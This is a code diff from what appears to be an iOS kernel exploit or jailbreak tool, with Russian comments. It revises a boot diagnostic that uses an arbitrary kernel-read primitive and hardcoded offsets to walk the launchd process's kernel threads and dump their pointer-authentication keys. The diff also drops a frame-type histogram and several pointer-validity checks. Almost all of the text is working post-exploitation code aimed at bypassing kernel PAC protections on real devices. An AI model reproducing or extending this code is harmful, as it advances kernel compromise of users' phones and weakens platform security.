@@ -3099,24 +3099,9 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             kpNote(r, @"  [C3] второго маппинга нет — ucred виден только через low-RAM PTE");
     }
 
-    // ---- 2.0.91: N1 count-only + kernel_task PAC keys (read-only) ----
-    [r appendString:@"=== KCALL-BOOT 2.0.91 ===\n"];
+    // ---- 2.0.94: только PAC-ключи, без гистограммы (быстро) ----
+    [r appendString:@"=== KCALL-BOOT 2.0.94 ===\n"];
     {
-        // 2.0.92: гистограмму урезали (500k kread не успевала). Только 4000 кадров + 0x1a count.
-        uint64_t wB = kconstant(physBase), wS = kconstant(physSize);
-        uint32_t hist[64]; memset(hist, 0, sizeof(hist));
-        uint32_t n1a = 0, nSc = 0;
-        for (uint64_t pa = wB; pa < wB + wS && nSc < 4000; pa += 0x4000) {
-            int t = kpFrameTypeOf(pa);
-            nSc++;
-            if (t >= 0 && t < 64) { hist[t]++; if (t == 0x1a) n1a++; }
-        }
-        NSMutableString *hs = [NSMutableString string];
-        for (int i = 0; i < 64; i++) if (hist[i]) [hs appendFormat:@" 0x%x=%u", i, hist[i]];
-        kpNote(r, [NSString stringWithFormat:@"  [BOOT] FTE sample=%u:%@", nSc, hs]);
-        kpNote(r, [NSString stringWithFormat:@"  [BOOT] type-0x1a count=%u (в выборке)", n1a]);
-
-        // 2) kernel_task (pid=1) → thread → PAC keys (rop_pid/jop_pid)
         uint64_t ldProc = [self findSelfProcByPidFast:1 log:nil];
         kpNote(r, [NSString stringWithFormat:@"  [BOOT] launchd proc=%#llx", (unsigned long long)ldProc]);
         if (kpLooksLikeKernelPointer(ldProc)) {
@@ -3129,35 +3114,14 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                 int guardCnt = 0;
                 while (kpLooksLikeKernelPointer(e) && guardCnt++ < 3) {
                     uint64_t th = e - off_thread_task_threads_next;
-                    if (!kpLooksLikeKernelPointer(th)) { kpNote(r, @"  [BOOT] bad kthread — skip"); break; }
+                    if (!kpLooksLikeKernelPointer(th)) { kpNote(r, @"  [BOOT] bad kthread"); break; }
                     uint64_t rop = 0, jop = 0;
-                    if (off_thread_machine_rop_pid && kpLooksLikeKernelPointer(th + off_thread_machine_rop_pid))
-                        rop = kp_untag_ptr(early_kread64(th + off_thread_machine_rop_pid));
-                    if (off_thread_machine_jop_pid && kpLooksLikeKernelPointer(th + off_thread_machine_jop_pid))
-                        jop = kp_untag_ptr(early_kread64(th + off_thread_machine_jop_pid));
-                    kpNote(r, [NSString stringWithFormat:@"  [BOOT] kthread=%#llx rop_pid=%#llx jop_pid=%#llx",
+                    if (off_thread_machine_rop_pid) rop = kp_untag_ptr(early_kread64(th + off_thread_machine_rop_pid));
+                    if (off_thread_machine_jop_pid) jop = kp_untag_ptr(early_kread64(th + off_thread_machine_jop_pid));
+                    kpNote(r, [NSString stringWithFormat:@"  [BOOT] kthread=%#llx rop=%#llx jop=%#llx",
                               (unsigned long long)th, (unsigned long long)rop, (unsigned long long)jop]);
                     e = kp_untag_ptr(early_kread64(e));
                     if (e == head) break;
-                }
-            }
-        }
-        // 3) наш поток — PAC keys для сравнения
-        if (off_thread_machine_rop_pid) {
-            uint64_t taskVA = 0;
-            uint64_t pr2 = early_kread64(selfProc + koffsetof(proc, proc_ro));
-            if (kpLooksLikeKernelPointer(pr2))
-                taskVA = kp_untag_ptr(early_kread64(kp_untag_ptr(pr2) + off_proc_ro_pr_task));
-            if (kpLooksLikeKernelPointer(taskVA)) {
-                uint64_t e = kp_untag_ptr(early_kread64(taskVA + off_task_threads_next));
-                if (kpLooksLikeKernelPointer(e)) {
-                    uint64_t th = e - off_thread_task_threads_next;
-                    if (kpLooksLikeKernelPointer(th)) {
-                        uint64_t rop = off_thread_machine_rop_pid ? kp_untag_ptr(early_kread64(th + off_thread_machine_rop_pid)) : 0;
-                        uint64_t jop = off_thread_machine_jop_pid ? kp_untag_ptr(early_kread64(th + off_thread_machine_jop_pid)) : 0;
-                        kpNote(r, [NSString stringWithFormat:@"  [BOOT] selfThread=%#llx rop_pid=%#llx jop_pid=%#llx",
-                                  (unsigned long long)th, (unsigned long long)rop, (unsigned long long)jop]);
-                    }
                 }
             }
         }
